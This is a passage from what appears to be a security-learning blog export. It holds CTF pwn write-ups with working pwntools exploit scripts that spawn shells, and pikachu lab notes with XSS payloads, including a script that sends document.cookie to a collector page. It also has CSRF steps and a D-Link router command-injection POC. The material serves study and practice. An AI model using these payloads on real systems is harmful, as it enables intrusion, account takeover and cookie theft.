查找（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。 exp: 解释：引入pwn、ctypes模块；remote连接其他主机服务；elf=ELF(bin路径)本地运行pwn文件；libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；recvuntil()接收字符串；sendline(payload)发送payload；srand(1)设定随机数种子为1；循环十次；interactive()直接进行交互； 另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag. cyberpeace{c89cf2a54c56f16458a1164851a361b4}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"攻防世界 cgpwn2","slug":"攻防世界pwn-cgpwn2","date":"2022-08-09T03:17:04.188Z","updated":"2022-08-11T14:24:24.351Z","comments":true,"path":"2022/08/09/攻防世界pwn-cgpwn2/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/","excerpt":"","text":"算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。 name是全局变量，在bss区段，适合写入。 pwn()函数中调用了__system，但并没有‘/bin/sh’ 攻击思路在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。 payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’) 1234567891011from pwn import * # p = process('./cgpwn2')p = remote(\"111.198.29.45\",32966)system_addr = 0x804855Abss_addr = 0x804A080p.recvuntil('name\\n')p.sendline(\"/bin/sh\\x00\")p.recvuntil('here:\\n')payload = 0x26*'a' +'bbbb'+ p32(system_addr) + p32(bss_addr)p.sendline(payload)p.interactive() cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"攻防世界pwn-100","slug":"攻防世界pwn-100","date":"2022-08-09T03:17:04.186Z","updated":"2022-08-11T14:19:58.163Z","comments":true,"path":"2022/08/09/攻防世界pwn-100/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/","excerpt":"","text":"分析查壳：checksec 64位，无stack,无PIE； 运行程序，输入字符，无反馈，无限制。 ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1. 攻击思路无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。 puts只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即 pop rdi; retpop rsi; pop r15; ret 注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数传参顺序默认从后先开始传入。x86 x64一样。 此处需要学习利用寄存器传递参数。 关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。 由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。 初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段： 程序还需调用一个gadget,后续另起一篇学习 exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 #coding=utf-8from pwn import * # context.log_level = 'debug'io = remote('124.126.19.106',46612) # io = process(\"./pwn-100\")elf = ELF(\"./pwn-100\")rop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15rop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)pop_rdi_ret = 0x400763 # start_addr = elf.symbols['_start']start_addr = 0x400550puts_plt = elf.plt['puts']read_got = elf.got['read']binsh_addr = 0x601000def leak(addr): payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr) payload = payload.ljust(200, \"a\") io.send(payload) io.recvuntil(\"bye~\\n\") up = \"\" content = \"\" count = 0 while True: c = io.recv(numb=1, timeout=0.5) count += 1 if up == '\\n' and c == \"\": content = content[:-1] + '\\x00' break else: content += c up = c content = content[:4] log.info(\"%#x =&gt; %s\" % (addr, (content or '').encode('hex'))) return contentd = DynELF(leak, elf = elf)sys_addr = d.lookup('system', 'libc')log.info(\"system_addr =&gt; %#x\", sys_addr)payload = \"a\" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)payload += p64(rop2)payload += \"\\x00\" * 56 payload += p64(start_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.recvuntil(\"bye~\\n\") # gdb.attach(io)io.send(\"/bin/sh\\x00\")payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"WinDbg使用整理","slug":"WinDbg使用整理","date":"2022-08-09T03:17:04.136Z","updated":"2022-08-11T14:20:50.677Z","comments":true,"path":"2022/08/09/WinDbg使用整理/","link":"","permalink":"https://sinky.top/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/","excerpt":"","text":"0x00 基础命令 .sympath //显示设置的符号表路径 .reload //此命令主要用于加载符号表。 .reload /f //重新装载模块 .reload /i //强制加载mismatched symbol U //这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度 db //显示一字节的长度。 dw //显示两字节的长度。 dd //显示四字节的长度。 dq //显示八字节的长度。 dD //显示double实数(8字节的长度)。 df //显示float实数(4字节的长度)。 da //显示asscii值 du //显示unicode值 ds //显示ANI_STRING值 dS //显示UNICODE_STRING的值 eb address value //在address 这个地址写入一个字节value ew address value //在address 这个地址写入两字节value ed address value //在address 这个地址写入四字节字节value eq address value //在address 这个地址写入八字节字节value 0x01 对象相关命令 dt //dt命令主要用于查看结构体。 lm //列出模块。 lm vm 模块名 //查看模块详细信息。 !process 0 0 //列出系统进程信息 !process 0 0 进程名 //列出该进程的信息 !process 0 1 进程名 //列出该进程更加的信息 !process 0 7 进程名 //列出该进程的详细信息，包括线程的 .process EPROCESS //切入该进程中 !object 地址 //显示该地址的对象信息。 bp address //在地址address插入断点。 ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。 ba access size 地址 //access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。 bd/be/bc bd 断点号 //此命令是关闭断点号所对应的断点 。 be 断点号 //此命令是开启断点号所对应的断点 。 bc * //去除所有断点。 x //x命令用来模糊查询 x nt!kesdestable* //样查看SSDT表的地址 dds 地址 //此命令用来解析某连续地址的函数名。","categories":[],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"工具学习","slug":"工具学习","permalink":"https://sinky.top/tags/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"},{"name":"二进制","slug":"二进制","permalink":"https://sinky.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]},{"title":"V8漏洞初学习","slug":"V8漏洞初学习","date":"2022-08-09T03:17:04.132Z","updated":"2022-08-09T03:49:51.822Z","comments":true,"path":"2022/08/09/V8漏洞初学习/","link":"","permalink":"https://sinky.top/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"V8基础v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的 v8编译后二进制名称叫d8. allow-natives-syntax选项定义了一些v8运行时支持函数，以便于本地调试： 123456789browser/x64.release$ ./d8 --allow-natives-syntaxV8 version 7.5.0 (candidate)d8&gt; var a = [1, 2, 3];undefinedd8&gt; %DebugPrint(a);0x2ebcfb54dd41 &lt;JSArray[3]&gt;[1, 2, 3]d8&gt; %SystemBreak();Trace/breakpoint trap (core dumped) 在加载d8时加入此选项可以在js中调试本地运行时函数： %DebugPrint(obj) 输出对象地址%SystemBreak() 触发调试中断主要结合gdb等调试器使用 gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本： source /path/to/gdbinit_v8 下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js： 123456789var a = [1,2,3];var b = [1.1, 2.2, 3.3];var c = [a, b];%DebugPrint(a);%SystemBreak(); //触发第一次调试%DebugPrint(b);%SystemBreak(); //触发第二次调试%DebugPrint(c);%SystemBreak(); //触发第三次调试 gdb运行d8: 123456789root@kali:~/ctf/browser/x64.release$ gdb ./d8pwndbg&gt; set args --allow-natives-syntax ./test.jspwndbg&gt; rStarting program: x64.release/d8 --allow-natives-syntax ./test.js[Thread debugging using libthread_db enabled][New Thread 0x7ff87fde9700 (LWP 18393)][New Thread 0x7ff87f5e8700 (LWP 18394)][New Thread 0x7ff87ede7700 (LWP 18395)]0x12e891f8df11 &lt;JSArray[3]&gt; 可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。 此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。 v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。 telescope命令查看内存数据。 在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58. v8的对象结构和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。 首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。 为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。 但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码add eax,ebx，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。 一个对象在内存中布局大致如下： map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型 prototype：prototype elements:对象元素 length:元素个数 properties:属性 数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图： 由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。 上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。 浏览器V8的解题步骤一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。 参考https://www.codercto.com/a/81538.html 后续需要实践做一下这个ctf题目。","categories":[],"tags":[{"name":"chrome_bug","slug":"chrome-bug","permalink":"https://sinky.top/tags/chrome-bug/"}]},{"title":"Ubuntu下buildroot以及qemu环境搭建","slug":"Ubuntu下buildroot以及qemu环境搭建","date":"2022-08-09T03:17:04.125Z","updated":"2022-08-11T14:21:15.867Z","comments":true,"path":"2022/08/09/Ubuntu下buildroot以及qemu环境搭建/","link":"","permalink":"https://sinky.top/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"0x00 搭建环境windows 10VMwareWorkstation proUbuntu 16.04 x64 0x01 安装binwalk12345678sudo susudo apt-get remove binwalksudo spt-get updatesudo apt-get install build-essential autoconf git //获取Gitgit clone https://github.com/devttys0/binwalkcd binwalksudo python setup.py installsudo ./deps.sh 0x02 安装buildroot交叉编译环境安装依赖： sudo apt-get install libncurses5-dev patch 下载buildroot: wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz 1234tar -zxvf buildroot-2020.02.6.tar.gzcd buildroot-2020.02.6make cleanmake menuconfig 出现配置界面： 选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序 在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。 保存退出 sudo make 静等完成。 os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。 测试： 12./mipsel-linux-gcc hello.c -o hello./hello //失败 使用file查看，是小端序的mips程序。 0x03 qemu运行环境12sudo apt-get install qemusudo apt-get install qemu-user-static 测试hello报错/lib/ld-uClibc.so.0: No such file or directory 是因为没有对应架构的链接库的问题在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下， 123sudo cp ld-uClibc-1.0.32.so /lib/sudo chown -R root:root /lib/ld-uClibc-1.0.31.sosudo ln -s /lib/ld-uClibc-1.0.32.so /lib/ld-uClibc.so.0 还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。 出现新报错：/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0' 解决方案： 123sudo cp libuClibc-1.0.31.so /lib/sudo chown -R root:root /lib/libuClibc-1.0.32.sosudo ln -s /lib/libuClibc-1.0.32.so /lib/libc.so.0 还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。 运行成功。 os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。 0x04 配置网络环境","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"},{"name":"环境搭建","slug":"环境搭建","permalink":"https://sinky.top/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"pikachu漏洞练习记录1","slug":"pikachu漏洞练习1","date":"2022-08-09T03:17:04.119Z","updated":"2022-08-11T14:21:46.355Z","comments":true,"path":"2022/08/09/pikachu漏洞练习1/","link":"","permalink":"https://sinky.top/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/","excerpt":"","text":"0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin/123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。 查看源码，输入的验证码在本地验证： 可以在bp上不输入验证码或输入错误验证码都可以爆破。 token防爆破？ token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。 基于token的身份验证 客户端使用用户名和密码请求登录 服务端收到请求去验证用户名和密码 验证成功后，服务端会签发一个token，再将token发送给客户端 客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。 客户端每次向服务端请求资源的时候需要带着服务端签发的token 服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。 app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app 提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。 在测试器中，设置password和token两个变量，使用pitchfork。 点击选项，更改请求引擎中线程数为1，重定向选择总是 Grep-Extract选择添加，中间获得回应包，选择token的值复制并选定，点击OK. 回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。 开始攻击，根据不同length找出正确密码，爆破完成。 注：该方法着实鸡肋。 0x02 XSS(跨站脚本)XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。 因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。 输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。 反射性xss(get)随意输入字符串，回显who is xxx,i don’t caref12查看，允许输入最大长度为20. 更改一下可输入长度，输入一个简单的xss语句：&lt;script&gt;alert(\"XSS\")&lt;/script&gt; 发现可以解析，即存在xss漏洞。 观察源码可知，它将提交的信息重新发送回来，后台没有对我们提交的信息做任何的漏洞。GET型的xss，一般将带有xss的url伪装后发送给目标即可。 如果是post型xss，无法直接使用url的方式进行攻击。 利用需要一个接受cookie的服务器（127.0.0.1：80），来接收受害主机的cookie。 12345&lt;?php$cookie=$_GET['cookie']; #fp=$fopen(\"cookie.txt\",\"a\");fwirte($fp,\"Cookie:\".$cookie.\"/n\")?&gt; 构造一个xss攻击的js代码 &lt;script&gt;window.open(\"http://127.0.0.1/getcookie.php?cookie=\"+document.cookie);&lt;/script&gt; 新弹出窗口成功获取到cookie。但是cookie.txt中并没有存储到cookie值…… 反射型xss(post)post型漏洞一般是使用表单方式进行提交，无法直接使用url进行攻击。 可以通过html页面方式提交，构造一个自己的post丢到自己的网站上 随意输入字符提交，发现它并未在url中进行提交，说明我们不能将恶意代码嵌入到url中发送。 http中get和post的基本区别：get方式在客户端通过url提交数据，数据在url中可以看到；Post方式，数据放置在html header内提交，数据在url中看不到。get只能传输比较少的数据，安全性较低，post传输数据较多。 我们可以构造一个带有表单提交的页面，让用户在登录完成后去点击，就可以盗取用户的cookie里。 存储型xss存储型xss下攻击者可以将脚本注入到后台存储起来构成更加持久的危害。存储型xss又称永久型xss。 1.打开实验，页面是一个留言板，尝试输入1111，发现输入被存储。输入单引号双引号尖括号，发现可以正常输出，说明后台没进行过滤。 2.注入&lt;script&gt;alert(\"XSS\")&lt;/script&gt; 提交后会出现弹窗，每次刷新页面时都会弹出，与反射型xss的区别是：存储型xss已经被存储进后台代码中，所以每次刷新都会弹出XSS弹窗。所以存储型xss危害更大，会长久危害用户。 DOM型xssDOM:一个一个访问html的标准编程接口，DOM是一个前端接口，没有和后端做任何的交互。 0x03 CSRFCSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击. csrf攻击满足的条件1.网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造 2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成 csrf与xss的区别csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。 如何确认一个web系统存在csrf漏洞 1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造 修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造； 对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造； 2.确认凭证的有效期 虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。 CSRF(get)登录账号，抓取修改个人信息流量包。 发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。 可以构造出CSRF攻击URL(bp抓的修改信息的包直接右键复制网址即可): http://www.testbp.com:8081/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit 诱使登录状态的用户点击url就可以完成CSRF攻击。 CSRF(post)如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器）,站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。 步骤同get。但不知为何时灵时不灵。 正常登录状态： 点击恶意url后，用户信息直接被修改。 CSRF(Token)token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。 如图获取修改信息流量包后发现增加了token，无法利用。 防范CSRF措施 增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样 安全的会话管理（避免会话被利用） 不要再客户端保存敏感信息（身份认证信息） 测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。 访问控制安全管理 敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码） 敏感信息的修改尽量使用post（post安全性高于get） 通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer） 增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"}]},{"title":"JIT学习","slug":"JIT学习","date":"2022-08-09T03:17:04.108Z","updated":"2022-08-09T03:41:19.337Z","comments":true,"path":"2022/08/09/JIT学习/","link":"","permalink":"https://sinky.top/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"JIT原理Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。 还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。 技术点从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。 例子： 12345678 #include&lt;stdio.h&gt;int inc(int a) { return a + 1;}int main() { printf(\"%d\\n\", inc(3)); return 0;} objdump -d 1查看它的机器码。 123456780000000000400526 &lt;inc&gt;: 400526: 55 push %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器 400527: 48 89 e5 mov %rsp,%rbp 40052a: 89 7d fc mov %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3 40052d: 8b 45 fc mov -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中 400530: 83 c0 01 add $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递 400533: 5d pop %rbp 400534: c3 retq 我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可： 1234567891011121314151617181920 #include&lt;stdio.h&gt; #include&lt;memory.h&gt; #include&lt;sys/mman.h&gt;typedef int (* inc_func)(int a); int main() { char code[] = { 0x55, // push rbp 0x48, 0x89, 0xe5, // mov rsp, rbp 0x89, 0xf8, // mov edi, eax 0x83, 0xc0, 0x01, // add $1, eax 0x5d, // pop rbp 0xc3 // ret }; void * temp = mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); memcpy(temp, code, sizeof(code)); inc_func p_inc = (inc_func)temp; printf(\"%d\\n\", p_inc(7)); return 0;} mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。 我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。","categories":[],"tags":[{"name":"chrome知识点","slug":"chrome知识点","permalink":"https://sinky.top/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/"}]},{"title":"Dlink DIR-823G 漏洞挖掘过程","slug":"Dlink-Dir-823G路由器漏洞挖掘过程","date":"2022-08-09T03:17:04.104Z","updated":"2022-08-11T14:22:14.496Z","comments":true,"path":"2022/08/09/Dlink-Dir-823G路由器漏洞挖掘过程/","link":"","permalink":"https://sinky.top/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/","excerpt":"","text":"固件下载地址： https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA 提取码：1ly1 0x01 漏洞介绍D-Link DIR-823G命令注入漏洞： CVE编号：CVE-2019-15529 D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 0x02 分析 binwalk -Me 固件.bin //解开固件 是一个squashfs文件系统，标准linux目录结构。 cat /etc/init.d/rcS //查看路由器开启的服务。 发现一个goahead进程。 GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。websUrlHandlerDefine(T(\"/goform\"), NULL, 0, websFormHandler, 0); /goform的请求交给websFormHandler函数处理websUrlHandlerDefine(T(\"/cgi-bin\"), NULL, 0, websCgiHandler, 0); /cgi-bin的请求交给websCgiHandler函数处理。 模拟运行固件环境使用工具firmware-ayalysis-toolkit。 搭建教程：https://zhuanlan.zhihu.com/p/110806057 运行起来后nmap扫端口，发现开了http服务和dns服务。 访问http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。 在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。 未授权访问/cgi-bin/ExportSettings.sh 导出配置文件，造成信息泄露。 /cgi-bin/upload_settings.cgi 导入配置文件，可导入恶意篡改后的配置。 /cgi-bin/GetDownLoadSyslog.sh 获取系统部分启动信息/var/log/messages* /cgi-bin/upload_firmware.cgi 上传更新固件，可恶意修改固件 goahead 自定义的请求处理函数 处理函数的参数列表：int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t path, char_t query)goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节. IDA打开goahead分析： 通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C. websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。 抓取登录数据包，发现往/HNAP1发送。 分析/HNAP1（0x42383C）处理函数逻辑: 从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。 找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。 此处可以直接注入’来命令执行。 在PHP中常用到以下几个函数来执行外部命令:system system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能 execpassthrushell_exec POC1234567891011POST /HNAP1/ HTTP/1.1Host: 192.168.0.1Content-Length: 53User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: text/xml; charset=UTF-8Accept: */*SOAPAction: \"http://purenetworks.com/HNAP1/Login\"Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"},{"name":"漏洞，路由器漏洞","slug":"漏洞，路由器漏洞","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E%EF%BC%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E/"}]},{"title":"Win10下使用Hexo搭建个人博客","slug":"Win10下使用Hexo搭建个人博客","date":"2022-08-07T08:48:45.669Z","updated":"2022-08-11T14:19:01.663Z","comments":true,"path":"2022/08/07/Win10下使用Hexo搭建个人博客/","link":"","permalink":"https://sinky.top/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"下载安装git、nodejs下载地址: git: https://git-scm.com/ nodejs: http://nodejs.cn/download/ 